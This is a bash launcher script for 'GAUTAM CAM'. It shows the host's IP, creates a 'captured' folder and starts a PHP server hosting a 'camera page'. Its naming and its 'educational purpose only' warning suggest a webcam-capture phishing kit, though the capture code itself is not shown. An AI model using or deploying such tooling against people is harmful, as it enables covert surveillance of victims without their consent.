#!/bin/bash

# ==========================================
# GAUTAM CAM - Startup Script
# ==========================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Clear screen
clear

# Show Banner
echo -e "${RED}"
cat banner.txt
echo -e "${NC}"

# Get IP
IP=$(hostname -I | awk '{print $1}')
echo -e "${GREEN}[+] Your IP Address: ${YELLOW}$IP${NC}"

# Create folders
mkdir -p captured

# Start PHP server
echo -e "${BLUE}[+] Starting PHP Server on port 8080...${NC}"
echo -e "${GREEN}[✓] Server started successfully!${NC}"
echo ""
echo -e "${YELLOW}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║                                                            ║${NC}"
echo -e "${YELLOW}║   📸 CAMERA PAGE: ${GREEN}http://$IP:8080/index.html${NC}              ${YELLOW}║${NC}"
echo -e "${YELLOW}║   📁 CAPTURED:   ${GREEN}ls captured/${NC}                                ${YELLOW}║${NC}"
echo -e "${YELLOW}║   📊 LOGS:       ${GREEN}cat camera.log${NC}                            ${YELLOW}║${NC}"
echo -e "${YELLOW}║   🗑️  CLEAN:      ${GREEN}rm -rf captured/*${NC}                          ${YELLOW}║${NC}"
echo -e "${YELLOW}║                                                            ║${NC}"
echo -e "${YELLOW}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${RED}⚠️  WARNING: Educational Purpose Only!${NC}"
echo -e "${RED}   Don't use without permission!${NC}"
echo ""
echo -e "${GREEN}[+] Press Ctrl+C to stop server${NC}"
echo ""

# Start PHP server
php -S 0.0.0.0:8080
